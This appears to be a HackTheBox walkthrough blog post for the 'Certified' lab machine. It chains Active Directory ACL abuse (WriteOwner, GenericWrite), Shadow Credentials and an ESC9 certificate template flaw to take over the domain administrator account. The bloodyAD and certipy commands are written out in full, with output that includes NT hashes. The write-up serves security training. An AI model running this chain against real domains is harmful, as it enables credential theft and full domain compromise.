---
title: "HackTheBox Certified Walkthrough"
date: 2026-09-26 20:30:00 +0300
categories: [HTB, HTB-AD]
tags: [active-directory, writeowner, shadow-credentials, adcs, esc9, kerberoasting, bloodyad, certipy]

---

# Description :

*Certified is a medium-difficulty Windows Active Directory machine set up as an assumed breach scenario. Starting with low-privilege credentials, we chain ACL misconfigurations to pivot through three accounts: abusing WriteOwner to take over a group, using GenericWrite for a Shadow Credentials attack, and exploiting an ESC9-vulnerable ADCS template to impersonate the domain administrator.*

## Enumeration

### Nmap

The port profile is a standard Domain Controller: Kerberos (88), LDAP (389/636), SMB (445), and WinRM (5985). The SSL certificate on LDAP confirms the domain `certified.htb` and the CA `certified-DC01-CA`.

```bash
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
```

Since this is an AD environment, we start by generating our hosts file entry:

```bash
nxc smb $TARGET --generate-hosts-file host
cat host | sudo tee -a /etc/hosts
```

### SMB (445)

We validate our starting credentials and enumerate shares:

```bash
nxc smb $TARGET -u judith.mader -p judith09 --shares
```

```text
SMB         10.129.231.186  445    DC01             [+] certified.htb\judith.mader:judith09
SMB         10.129.231.186  445    DC01             Share           Permissions            Remark
SMB         10.129.231.186  445    DC01             -----           -----------            ------
SMB         10.129.231.186  445    DC01             ADMIN$                                 Remote Admin
SMB         10.129.231.186  445    DC01             C$                                     Default share
SMB         10.129.231.186  445    DC01             IPC$            READ                   Remote IPC
SMB         10.129.231.186  445    DC01             NETLOGON        READ                   Logon server share
SMB         10.129.231.186  445    DC01             SYSVOL          READ                   Logon server share
```

Standard DC shares, nothing interesting. With valid domain credentials, we check for misconfigured ACLs that could give us an escalation path.

### BloodHound

We collect AD data using RustHound:

```bash
rusthound-ce -d certified.htb -u judith.mader -p judith09 -c All --zip
```

BloodHound shows a direct attack chain from our starting user to `ca_operator`:

```
JUDITH.MADER --WriteOwner--> MANAGEMENT [Group] --GenericWrite--> MANAGEMENT_SVC --GenericAll--> CA_OPERATOR
```

![[bloodhound-chain.png]]

## Foothold: judith.mader → management_svc

Our user `judith.mader` has WriteOwner over the `Management` group. WriteOwner lets us set ourselves as the object's owner, which implicitly grants WriteDacl, the ability to modify the object's ACL. From there we can grant ourselves any permission we want.

**Step 1:** Take ownership of the Management group.

```bash
bloodyAD --host 10.129.231.186 -u judith.mader -p judith09 set owner MANAGEMENT JUDITH.MADER
```

```text
[+] Old owner S-1-5-21-729746778-2675978091-3820388244-512 is now replaced by JUDITH.MADER on MANAGEMENT
```

**Step 2:** Grant ourselves GenericAll over the group.

```bash
bloodyAD --host 10.129.231.186 -u judith.mader -p judith09 add genericAll MANAGEMENT judith.mader
```

```text
[+] judith.mader has now GenericAll on MANAGEMENT
```

**Step 3:** Add judith.mader to the Management group. This gives us the GenericWrite permission that the group holds over `management_svc`.

```bash
bloodyAD --host 10.129.231.186 -u judith.mader -p judith09 add groupMember MANAGEMENT judith.mader
```

```text
[+] judith.mader added to MANAGEMENT
```

**Step 4:** With GenericWrite over `management_svc`, we have two options: Targeted Kerberoasting or Shadow Credentials. We try Kerberoasting first since it's less invasive:

```bash
targetedKerberoast -v -d certified.htb -u judith.mader -p 'judith09'
```

![[targeted-kerberoast.png]]

We get a TGS hash, but it doesn't crack against rockyou:

```text
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
```

Time for Shadow Credentials. This attack abuses GenericWrite to add a Key Credential to the target account, then uses that credential to authenticate via PKINIT and extract the NT hash:

```bash
certipy shadow auto -target certified.htb -dc-ip 10.129.231.186 -username judith.mader -password 'judith09' -account MANAGEMENT_SVC
```

```text
[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'b95ca393242843acb2997d5b879c6d3d'
[*] Adding Key Credential with device ID 'b95ca393242843acb2997d5b879c6d3d' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID 'b95ca393242843acb2997d5b879c6d3d' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Using principal: 'management_svc@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

![[shadow-creds-mgmt-svc.png]]

## Lateral Movement: management_svc → ca_operator

With `management_svc`'s NT hash and GenericAll over `ca_operator`, we repeat the Shadow Credentials attack. In a real engagement, changing an account's password is disruptive, so Shadow Credentials is the preferred approach:

```bash
certipy shadow auto -target certified.htb -dc-ip 10.129.231.186 -username management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -account CA_OPERATOR
```

```text
[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'e4938e2e10684e01b82874bafe0118f6'
[*] Adding Key Credential with device ID 'e4938e2e10684e01b82874bafe0118f6' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID 'e4938e2e10684e01b82874bafe0118f6' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: 'ca_operator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```

![[shadow-creds-ca-operator.png]]

## Privilege Escalation: ca_operator → administrator (ESC9)

The account name `ca_operator` hints at an ADCS-related path. We enumerate vulnerable certificate templates:

```bash
certipy find -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -target certified.htb -vuln -stdout
```

```text
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
                                          NoSecurityExtension
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
    [!] Vulnerabilities
      ESC9                              : Template has no security extension.
```

![[certipy-esc9-template.png]]

The `CertifiedAuthentication` template is vulnerable to ESC9. The `NoSecurityExtension` flag means the certificate won't include the `szOID_NTDS_CA_SECURITY_EXT` OID (`1.3.6.1.4.1.311.25.2`), which is what the DC uses to map a certificate back to the requesting account's `objectSID`. Without this enforcement, the DC relies solely on the UPN in the certificate for identity mapping.

The attack works like this: we use `management_svc` (which has GenericAll over `ca_operator`) to change `ca_operator`'s UPN to `administrator@certified.htb`. Then we request a certificate as `ca_operator`. The certificate is issued with the administrator's UPN. Before authenticating with it, we revert the UPN, otherwise the DC would see two accounts with the same UPN and fail the lookup.

**Step 1:** Update ca_operator's UPN to administrator.

```bash
certipy account -target certified.htb -dc-ip 10.129.231.186 -username management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -upn administrator@certified.htb -user CA_OPERATOR update
```

```text
[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator@certified.htb
[*] Successfully updated 'ca_operator'
```

**Step 2:** Request a certificate using the vulnerable template.

```bash
certipy req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.231.186 -target certified.htb -ca certified-DC01-CA -template CertifiedAuthentication
```

**Step 3:** Revert the UPN before authenticating.

```bash
certipy account -target certified.htb -dc-ip 10.129.231.186 -username management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -upn ca_operator@certified.htb -user CA_OPERATOR update
```

```text
[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

**Step 4:** Authenticate with the certificate and retrieve the administrator's NT hash.

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.231.186
```

```text
[*] Certificate identities:
[*]     SAN UPN: 'administrator@certified.htb'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

![[admin-hash.png]]

With the administrator's NT hash, we have full domain compromise.

## References

- [Certipy - AD CS Abuse (ESC9)](https://github.com/ly4k/Certipy)
- [bloodyAD - AD Privilege Escalation](https://github.com/CravateRouge/bloodyAD)
- [Shadow Credentials Attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [Targeted Kerberoasting](https://github.com/ShutdownRepo/targetedKerberoast)
